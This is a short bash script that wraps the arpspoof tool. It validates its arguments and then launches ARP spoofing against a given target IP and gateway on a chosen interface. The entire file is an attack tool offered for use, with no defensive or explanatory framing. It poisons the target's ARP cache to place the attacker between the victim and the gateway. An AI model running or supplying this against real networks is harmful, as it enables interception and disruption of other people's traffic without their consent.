#!/bin/bash
# arpspoof - ARP Spoofing
# Options:
# -i : Interface to use
# -t : Target IP address

# Usage: arpspoof.sh <interface> <target_ip> <gateway_ip>
# Example script
# arpspoof.sh eth0 192.168.1.10 192.168.1.1

# Check if arpspoof is installed
if ! command -v arpspoof &> /dev/null
then
    echo "arpspoof could not be found, please install it first."
    exit
fi

# Ensure parameters are provided
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <interface> <target_ip> <gateway_ip>"
    exit 1
fi

INTERFACE=$1
TARGET_IP=$2
GATEWAY_IP=$3

echo "Starting ARP spoofing on interface $INTERFACE targeting $TARGET_IP and gateway $GATEWAY_IP"

# Perform ARP spoofing
arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY_IP

echo "ARP spoofing completed."
